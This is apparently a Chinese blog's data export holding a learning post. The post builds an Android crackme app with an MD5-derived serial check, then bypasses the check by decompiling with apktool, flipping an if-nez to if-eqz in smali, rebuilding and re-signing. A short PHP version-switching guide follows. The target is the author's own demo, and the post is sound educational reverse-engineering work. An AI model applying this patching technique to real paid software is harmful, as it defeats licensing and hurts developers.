class=\"line\">    &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;successed&quot;&gt;恭喜您！注册成功&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_register&quot;&gt;注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_androidInstance&quot;&gt;Android程序破解演示实例&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_username&quot;&gt;用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_serialNo&quot;&gt;注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_pleaseinputusername&quot;&gt;请输入用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_input16chars&quot;&gt;请输入16位注册码&lt;/string&gt;</div><div class=\"line\">&lt;/resources&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"让程序Run起来\"><a href=\"#让程序Run起来\" class=\"headerlink\" title=\"让程序Run起来\"></a>让程序Run起来</h2><p>在AS中run - Run”app”，如果没有虚拟机，可以新建一个。<br><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_01.png\" alt=\"RUN起来\"></p>\n<h2 id=\"发布APK\"><a href=\"#发布APK\" class=\"headerlink\" title=\"发布APK\"></a>发布APK</h2><ul>\n<li><p>“Build -&gt; Build APK” 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）</p>\n</li>\n<li><p>“Build -&gt; Generate Signed APK”。选择keystore然后Next就可以了。</p>\n<p>  <img src=\"/2017/07/Android开发及破解入门实例/Screenshot_02.png\" alt=\"生成keystore\"><br>  此处也可以用keytool工具生成keystore文件。命令如下：</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"APK逆向\"><a href=\"#APK逆向\" class=\"headerlink\" title=\"APK逆向\"></a>APK逆向</h2><blockquote>\n<p>  APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。</p>\n</blockquote>\n<ul>\n<li>apktool  用于反编译和重新编译</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool d crackme01.apk</div><div class=\"line\">I: Using Apktool 2.2.3 on crackme01.apk</div><div class=\"line\">I: Loading resource table...</div><div class=\"line\">I: Decoding AndroidManifest.xml with resources...</div><div class=\"line\">I: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk</div><div class=\"line\">I: Regular manifest package...</div><div class=\"line\">I: Decoding file-resources...</div><div class=\"line\">I: Decoding values */* XMLs...</div><div class=\"line\">I: Baksmaling classes.dex...</div><div class=\"line\">I: Copying assets and libs...</div><div class=\"line\">I: Copying unknown files...</div><div class=\"line\">I: Copying original files...</div></pre></td></tr></table></figure>\n<ul>\n<li><p>把整个生成的crackme01文件夹拽入visual studio code中。</p>\n</li>\n<li><p>搜索关键字”无效用户名或注册码”，在res/values/strings.xml中找到:</p>\n<blockquote>\n<pre><code>&lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”unsucessed”,在res/values/public.xml中找到:<blockquote>\n<pre><code>&lt;public type=&quot;string&quot; name=&quot;unsucessed&quot; id=&quot;0x7f06002b&quot; /&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”0x7f06002b”,在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。</li>\n</ul>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_03.png\" alt=\"smali代码\"></p>\n<ul>\n<li><p>具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。</p>\n</li>\n<li><p>重新生成APK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool b crackme01</div><div class=\"line\">I: Using Apktool 2.2.3</div><div class=\"line\">I: Checking whether sources has changed...</div><div class=\"line\">I: Smaling smali folder into classes.dex...</div><div class=\"line\">I: Checking whether resources has changed...</div><div class=\"line\">I: Building resources...</div><div class=\"line\">I: Building apk file...</div><div class=\"line\">I: Copying unknown files/dir...</div><div class=\"line\"># 生成的APK在crackme01/dist/crackme01.apk</div></pre></td></tr></table></figure>\n</li>\n<li><p>重新签名</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa</div><div class=\"line\">输入密钥库的密码短语:</div><div class=\"line\">   正在添加: META-INF/MANIFEST.MF</div><div class=\"line\">   正在添加: META-INF/AAA.SF</div><div class=\"line\">   正在添加: META-INF/AAA.RSA</div><div class=\"line\">  正在签名: AndroidManifest.xml</div><div class=\"line\">  正在签名: classes.dex</div><div class=\"line\">  ......</div><div class=\"line\">  正在签名: resources.arsc</div><div class=\"line\">jar 已签名。</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_04.png\" alt=\"安装到虚拟机上运行\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><pre><code>路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。\n</code></pre>","site":{"data":{}},"excerpt":"<blockquote>\n<p>  原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。  结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。</p>\n</blockquote>\n<h2 id=\"开发环境安装\"><a href=\"#开发环境安装\" class=\"headerlink\" title=\"开发环境安装\"></a>开发环境安装</h2><p><a href=\"https://developer.android.com\">Android开发者官网</a></p>\n<p><a href=\"https://developer.android.com/studio/index.html\">Android Studio下载页面</a></p>\n<p><a href=\"https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-ide-162.4069837-mac.dmg\">Android Studio 2.3.3.0 for mac下载直连</a></p>\n<p><a href=\"https://developer.android.com/ndk/downloads/index.html\">Android NDK</a> # 其实这个工具在这里并没有用到，可以等后续再下载安装。</p>\n<p># Android Studio包含了JDK，故而不需要单独安装JDK。<br>上述链接应该是都需要翻墙才能访问。</p>","more":"<h2 id=\"项目编码\"><a href=\"#项目编码\" class=\"headerlink\" title=\"项目编码\"></a>项目编码</h2><p>打开AS，一路Next，就新建好一个项目。</p>\n<blockquote>\n<p>  第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（<a href=\"https://services.gradle.org/distributions/gradle-3.3-all.zip\">gradle-3.3</a>），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。</p>\n</blockquote>\n<p>打开app/res/layout/activity_main.xml,设计layout。</p>\n<p>采用Android最新的约束性布局ConstraintLayout。</p>\n<p><img src=\"/2017/07/Android开发及破解入门实例/constraintLayout.png\" alt=\"设计效果\"><br>具体的xml代码如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</div><div class=\"line\">&lt;android.support.constraint.ConstraintLayout</div><div class=\"line\">    xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</div><div class=\"line\">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</div><div class=\"line\">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</div><div class=\"line\">    android:layout_width=&quot;match_parent&quot;</div><div class=\"line\">    android:layout_height=&quot;match_parent&quot;</div><div class=\"line\">    tools:context=&quot;cn.oddboy.xx.crackme01.MainActivity&quot;</div><div class=\"line\">    tools:layout_editor_absoluteY=&quot;81dp&quot;</div><div class=\"line\">    tools:layout_editor_absoluteX=&quot;0dp&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView&quot;</div><div class=\"line\">        android:layout_width=&quot;368dp&quot;</div><div class=\"line\">        android:layout_height=&quot;25dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_androidInstance&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textAllCaps=&quot;false&quot;</div><div class=\"line\">        android:textSize=&quot;18sp&quot;</div><div class=\"line\">        android:textStyle=&quot;bold&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView2&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_serialNo&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/sn&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;TextView</div><div class=\"line\">        android:id=&quot;@+id/textView3&quot;</div><div class=\"line\">        android:layout_width=&quot;wrap_content&quot;</div><div class=\"line\">        android:layout_height=&quot;17dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_username&quot;</div><div class=\"line\">        android:textAlignment=&quot;center&quot;</div><div class=\"line\">        android:textSize=&quot;14sp&quot;</div><div class=\"line\">        app:layout_constraintBottom_toBottomOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toTopOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/sn&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_input16chars&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/button&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;@+id/userName&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/userName&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;EditText</div><div class=\"line\">        android:id=&quot;@+id/userName&quot;</div><div class=\"line\">        android:layout_width=&quot;215dp&quot;</div><div class=\"line\">        android:layout_height=&quot;43dp&quot;</div><div class=\"line\">        android:ems=&quot;10&quot;</div><div class=\"line\">        android:hint=&quot;@string/str_pleaseinputusername&quot;</div><div class=\"line\">        android:inputType=&quot;textPersonName&quot;</div><div class=\"line\">        app:layout_constraintBottom_toTopOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintLeft_toRightOf=&quot;@+id/textView3&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/textView&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">    &lt;Button</div><div class=\"line\">        android:id=&quot;@+id/button&quot;</div><div class=\"line\">        android:layout_width=&quot;88dp&quot;</div><div class=\"line\">        android:layout_height=&quot;48dp&quot;</div><div class=\"line\">        android:text=&quot;@string/str_register&quot;</div><div class=\"line\">        app:layout_constraintTop_toBottomOf=&quot;@+id/sn&quot;</div><div class=\"line\">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</div><div class=\"line\">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</div><div class=\"line\">        android:layout_marginTop=&quot;-13dp&quot;</div><div class=\"line\">        app:layout_constraintHorizontal_bias=&quot;0.858&quot; /&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;/android.support.constraint.ConstraintLayout&gt;</div></pre></td></tr></table></figure></p>\n<p>打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div></pre></td><td class=\"code\"><pre><div class=\"line\">package cn.oddboy.xx.crackme01;</div><div class=\"line\"></div><div class=\"line\">import android.support.v7.app.AppCompatActivity;</div><div class=\"line\">import android.os.Bundle;</div><div class=\"line\">import android.view.View;</div><div class=\"line\">import android.widget.Button;</div><div class=\"line\">import android.widget.EditText;</div><div class=\"line\">import android.widget.Toast;</div><div class=\"line\"></div><div class=\"line\">import java.security.MessageDigest;</div><div class=\"line\">import java.security.NoSuchAlgorithmException;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">public class MainActivity extends AppCompatActivity &#123;</div><div class=\"line\"></div><div class=\"line\">    @Override</div><div class=\"line\">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class=\"line\">        super.onCreate(savedInstanceState);</div><div class=\"line\">        setContentView(R.layout.activity_main);</div><div class=\"line\">        setTitle(R.string.unregister);</div><div class=\"line\">        final EditText edit_userName=(EditText)findViewById(R.id.userName);</div><div class=\"line\">        final EditText edit_sn=(EditText)findViewById(R.id.sn);</div><div class=\"line\">        final Button btn_reg=(Button)findViewById(R.id.button);</div><div class=\"line\">        btn_reg.setOnClickListener(new View.OnClickListener() &#123;</div><div class=\"line\">            @Override</div><div class=\"line\">            public void onClick(View view) &#123;</div><div class=\"line\">                if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show();</div><div class=\"line\">                &#125;else &#123;</div><div class=\"line\">                    Toast.makeText(MainActivity.this,</div><div class=\"line\">                            R.string.successed,Toast.LENGTH_SHORT).show();</div><div class=\"line\">                    btn_reg.setEnabled(false);</div><div class=\"line\">                    setTitle(R.string.registered);</div><div class=\"line\">                &#125;</div><div class=\"line\">            &#125;</div><div class=\"line\">        &#125;);</div><div class=\"line\">    &#125;</div><div class=\"line\">    public static String bytesToHex(byte[] in) &#123;</div><div class=\"line\">        final StringBuilder builder = new StringBuilder();</div><div class=\"line\">        for(byte b : in) &#123;</div><div class=\"line\">            builder.append(String.format(&quot;%02x&quot;, b));</div><div class=\"line\">        &#125;</div><div class=\"line\">        return builder.toString();</div><div class=\"line\">    &#125;</div><div class=\"line\">    private boolean checkSN(String userName, String sn)&#123;</div><div class=\"line\">        try&#123;</div><div class=\"line\">            if ((userName==null)||(userName.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            if ((sn==null)||(sn.length()==0))</div><div class=\"line\">                return false;</div><div class=\"line\">            MessageDigest digest=MessageDigest.getInstance(&quot;MD5&quot;);</div><div class=\"line\">            digest.reset();</div><div class=\"line\">            digest.update(userName.getBytes());</div><div class=\"line\">            byte[] bytes=digest.digest();</div><div class=\"line\">            String hexstr= bytesToHex(bytes);</div><div class=\"line\">            StringBuilder sb = new StringBuilder();</div><div class=\"line\">            for (int i=0;i&lt;hexstr.length();i+=2)&#123;</div><div class=\"line\">                sb.append(hexstr.charAt(i));</div><div class=\"line\">            &#125;</div><div class=\"line\">            String userSN=sb.toString();</div><div class=\"line\">            if (!userSN.equalsIgnoreCase(sn))</div><div class=\"line\">                return false;</div><div class=\"line\">        &#125; catch (NoSuchAlgorithmException e)&#123;</div><div class=\"line\">            e.printStackTrace();</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">        return true;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>app/res/values/strings.xml<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;resources&gt;</div><div class=\"line\">    &lt;string name=&quot;app_name&quot;&gt;Crackme01&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;successed&quot;&gt;恭喜您！注册成功&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_register&quot;&gt;注册&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_androidInstance&quot;&gt;Android程序破解演示实例&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_username&quot;&gt;用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_serialNo&quot;&gt;注册码&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_pleaseinputusername&quot;&gt;请输入用户名&lt;/string&gt;</div><div class=\"line\">    &lt;string name=&quot;str_input16chars&quot;&gt;请输入16位注册码&lt;/string&gt;</div><div class=\"line\">&lt;/resources&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"让程序Run起来\"><a href=\"#让程序Run起来\" class=\"headerlink\" title=\"让程序Run起来\"></a>让程序Run起来</h2><p>在AS中run - Run”app”，如果没有虚拟机，可以新建一个。<br><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_01.png\" alt=\"RUN起来\"></p>\n<h2 id=\"发布APK\"><a href=\"#发布APK\" class=\"headerlink\" title=\"发布APK\"></a>发布APK</h2><ul>\n<li><p>“Build -&gt; Build APK” 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名）</p>\n</li>\n<li><p>“Build -&gt; Generate Signed APK”。选择keystore然后Next就可以了。</p>\n<p>  <img src=\"/2017/07/Android开发及破解入门实例/Screenshot_02.png\" alt=\"生成keystore\"><br>  此处也可以用keytool工具生成keystore文件。命令如下：</p>\n  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"APK逆向\"><a href=\"#APK逆向\" class=\"headerlink\" title=\"APK逆向\"></a>APK逆向</h2><blockquote>\n<p>  APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。</p>\n</blockquote>\n<ul>\n<li>apktool  用于反编译和重新编译</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool d crackme01.apk</div><div class=\"line\">I: Using Apktool 2.2.3 on crackme01.apk</div><div class=\"line\">I: Loading resource table...</div><div class=\"line\">I: Decoding AndroidManifest.xml with resources...</div><div class=\"line\">I: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apk</div><div class=\"line\">I: Regular manifest package...</div><div class=\"line\">I: Decoding file-resources...</div><div class=\"line\">I: Decoding values */* XMLs...</div><div class=\"line\">I: Baksmaling classes.dex...</div><div class=\"line\">I: Copying assets and libs...</div><div class=\"line\">I: Copying unknown files...</div><div class=\"line\">I: Copying original files...</div></pre></td></tr></table></figure>\n<ul>\n<li><p>把整个生成的crackme01文件夹拽入visual studio code中。</p>\n</li>\n<li><p>搜索关键字”无效用户名或注册码”，在res/values/strings.xml中找到:</p>\n<blockquote>\n<pre><code>&lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”unsucessed”,在res/values/public.xml中找到:<blockquote>\n<pre><code>&lt;public type=&quot;string&quot; name=&quot;unsucessed&quot; id=&quot;0x7f06002b&quot; /&gt;\n</code></pre></blockquote>\n</li>\n<li>搜索关键字”0x7f06002b”,在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。</li>\n</ul>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_03.png\" alt=\"smali代码\"></p>\n<ul>\n<li><p>具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。</p>\n</li>\n<li><p>重新生成APK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  apktool b crackme01</div><div class=\"line\">I: Using Apktool 2.2.3</div><div class=\"line\">I: Checking whether sources has changed...</div><div class=\"line\">I: Smaling smali folder into classes.dex...</div><div class=\"line\">I: Checking whether resources has changed...</div><div class=\"line\">I: Building resources...</div><div class=\"line\">I: Building apk file...</div><div class=\"line\">I: Copying unknown files/dir...</div><div class=\"line\"># 生成的APK在crackme01/dist/crackme01.apk</div></pre></td></tr></table></figure>\n</li>\n<li><p>重新签名</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa</div><div class=\"line\">输入密钥库的密码短语:</div><div class=\"line\">   正在添加: META-INF/MANIFEST.MF</div><div class=\"line\">   正在添加: META-INF/AAA.SF</div><div class=\"line\">   正在添加: META-INF/AAA.RSA</div><div class=\"line\">  正在签名: AndroidManifest.xml</div><div class=\"line\">  正在签名: classes.dex</div><div class=\"line\">  ......</div><div class=\"line\">  正在签名: resources.arsc</div><div class=\"line\">jar 已签名。</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/07/Android开发及破解入门实例/Screenshot_04.png\" alt=\"安装到虚拟机上运行\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><pre><code>路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。\n</code></pre>"},{"title":"PHP多版本安装与切换(Ubuntu-16-04-LTS)","date":"2017-07-26T01:06:16.000Z","_content":">   打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。\n>   结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~\n\n## PPA安装PHP\n### - 安装PHP 5.6\n```\n$ sudo apt-get install software-properties-common   # 安装PPA工具\n$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的\n$ sudo apt-get update\n$ sudo apt-get install -y php5.6\n```\n### - 安装PHP 7.1\n```\n$ sudo apt-get install python-software-properties\n$ sudo add-apt-repository ppa:ondrej/php\n$ sudo apt-get update\n$ sudo apt-get install -y php7.1                    \n```\n\n## PHP版本切换\n### PHP 5.6 => PHP 7.1\n```\nApache:-\n$ sudo a2dismod php5.6\n$ sudo a2enmod php7.1\n$ sudo service apache2 restart\n\nCLI:-\n$ update-alternatives --set php /usr/bin/php7.1\n```\n### PHP 7.1 => PHP 5.6\n```\nApache:-\n$ sudo a2dismod php7.1\n$ sudo a2enmod php5.6\n$ sudo service apache2 restart\n\nCLI:-\n$ sudo update-alternatives --set php /usr/bin/php5.6\n```\n## 